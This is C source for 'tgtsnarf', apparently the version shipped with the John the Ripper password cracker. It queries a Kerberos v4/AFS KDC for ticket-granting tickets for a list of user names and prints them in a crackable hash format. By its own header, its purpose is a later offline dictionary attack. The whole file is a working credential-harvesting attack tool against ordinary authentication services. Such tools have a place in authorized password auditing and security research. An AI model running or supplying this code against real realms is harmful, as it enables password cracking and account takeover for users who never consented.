/*
  tgtsnarf

  Collect AFS/Kerberos TGTs for later offline dictionary attack.

  Copyright (c) 1999 Dug Song <dugsong@monkey.org>
  All rights reserved, all wrongs reversed.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

  1. Redistributions of source code must retain the above copyright
     notice, this list of conditions and the following disclaimer.
  2. Redistributions in binary form must reproduce the above copyright
     notice, this list of conditions and the following disclaimer in the
     documentation and/or other materials provided with the distribution.
  3. The name of author may not be used to endorse or promote products
     derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include "memory.h"
#include "memdbg.h"

#define VERSION		"1.2"
#define TGT_LENGTH	16

#ifndef MIN
#define MIN(a,b)	(((a)<(b))?(a):(b))
#endif

typedef struct ktext_st {
  unsigned int length;
  unsigned char dat[1250];
} KTEXT_ST;

int AFS = 0;

void
usage(void)
{
  fprintf(stderr, "Usage: tgtsnarf [-A] realm host [users...]\n");
  exit(1);
}

unsigned long
resolve_host(char *host)
{
  unsigned long addr;
  struct hostent *hp;

  if ((addr = inet_addr(host)) == -1) {
    if ((hp = gethostbyname(host)) == NULL)
      return (-1);
    memcpy((char *)&addr, hp->h_addr, sizeof(addr));
  }
  return (addr);
}

int
krb_put_int(unsigned long from, void *to, int size)
{
  int i;
  unsigned char *p = (unsigned char *)to;

  for (i = size - 1; i >= 0; i--) {
    p[i] = from & 0xff;
    from >>= 8;
  }
  return (size);
}

int
krb_put_string(char *from, void *to)
{
  strcpy((char *)to, from);
  return (strlen(from) + 1);
}

int
make_req(unsigned char *dst, char *user, char *realm)
{
  char *pname, *pinst;
  struct timeval tv;
  unsigned char *p;

  if ((pname = strdup(user)) == NULL)
    return (-1);

  if ((pinst = strchr(pname, '.')) != NULL)
    *pinst++ = '\0';
  else pinst = pname + strlen(pname);

  gettimeofday(&tv, NULL);

  p = dst;
  p += krb_put_int(4, p, 1);			/* protocol version */
  p += krb_put_int((1 << 1), p, 1);		/* msg type (KDC_REQUEST) */
  p += krb_put_string(pname, p);		/* principal name */
  p += krb_put_string(pinst, p);		/* principal instance */
  p += krb_put_string(realm, p);		/* realm */
  p += krb_put_int(tv.tv_sec, p, 4);		/* time */
  p += krb_put_int(120, p, 1);			/* lifetime (120) */
  p += krb_put_string("krbtgt", p);		/* service name (krbtgt)*/
  p += krb_put_string(realm, p);		/* service instance (realm) */

  MEM_FREE(pname);

  return (p - dst);
}

int
find_tkt(KTEXT_ST *ktext, unsigned char *dst, int size)
{
  unsigned char *p;
  int type, len;

  p = ktext->dat;
  p += 1;			/* version */
  type = *p++;
  type &= ~1;			/* msg type */

  if (type != (2 << 1))		/* KDC_REPLY */
    return (-1);

  p += strlen((char*)p) + 1;	/* name */
  p += strlen((char*)p) + 1;	/* instance */
  p += strlen((char*)p) + 1;	/* realm */
  p += 4;			/* time */
  p += 1;			/* # tickets */
  p += 4;			/* exp date */
  p += 1;			/* master kvno */
  p += 2;			/* length */

  len = MIN(ktext->length - (p - ktext->dat), size);
  memcpy(dst, p, len);

  return (len);
}

int
fetch_tgt(char *host, char *user, char *realm, unsigned char *dst, int size)
{
  struct sockaddr_in from, to;
  KTEXT_ST ktext;
  int sock;
  socklen_t alen;

  /* Fill in dest addr. */
  memset(&to, 0, sizeof(to));
  if ((to.sin_addr.s_addr = resolve_host(host)) == -1) {
    fprintf(stderr, "bad host: %s\n", host);
    return (-1);
  }
  to.sin_family = AF_INET;
  to.sin_port = htons(750);

  /* Fill in our TGT request. */
  ktext.length = make_req(ktext.dat, user, realm);

  /* Send it to KDC. */
  if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
    perror("socket");
    return (-1);
  }
  alen = sizeof(to);
  if (sendto(sock, ktext.dat, ktext.length, 0, (struct sockaddr *)&to, alen)
      < 0) {
    perror("send");
    close(sock);
    return (-1);
  }
  /* Read reply. */
  if ((ktext.length = recvfrom(sock, ktext.dat, sizeof(ktext.dat), 0,
			       (struct sockaddr *)&from, &alen)) <= 0) {
    perror("recv");
    close(sock);
    return (-1);
  }
  close(sock);

  /* Extract TGT. */
  return (find_tkt(&ktext, dst, size));
}

void
print_tgt(char *host, char *user, char *realm)
{
  unsigned char tgt[TGT_LENGTH];
  int i, len;

  if ((len = fetch_tgt(host, user, realm, tgt, sizeof(tgt))) == -1) {
    fprintf(stderr, "==> couldn't get tgt for %s@%s\n", user, realm);
  }
  else {
    printf("%s:$%s$%s$", user, AFS ? "af" : "k4", realm);

    for (i = 0; i < len; i++)
      printf("%.2x", tgt[i]);

    printf("\n");
  }
}

char *
upcase(char *string)
{
  char *p;

  for (p = string; *p != '\0'; p++)
    *p = toupper(*p);

  return (string);
}

int
main(int argc, char *argv[])
{
  char c, *p, *host, *realm, user[128];
  int i;

  host = realm = NULL;

  while ((c = getopt(argc, argv, "h?AV")) != EOF) {
    switch (c) {
    case 'A':
      AFS = 1;
      break;
    case 'V':
      fprintf(stderr, "Version: %s\n", VERSION);
      usage();
      break;
    default:
      usage();
    }
  }
  argc -= optind;
  argv += optind;

  if (argc < 2)
    usage();

  realm = upcase(argv[0]);
  host = argv[1];

  if (argc == 2) {
    while (fgets(user, sizeof(user), stdin) != NULL) {
      if ((p = strrchr(user, '\n')) != NULL)
	*p = '\0';
      print_tgt(host, user, realm);
    }
  }
  else {
    for (i = 2; i < argc; i++)
      print_tgt(host, argv[i], realm);
  }
  exit(0);
}
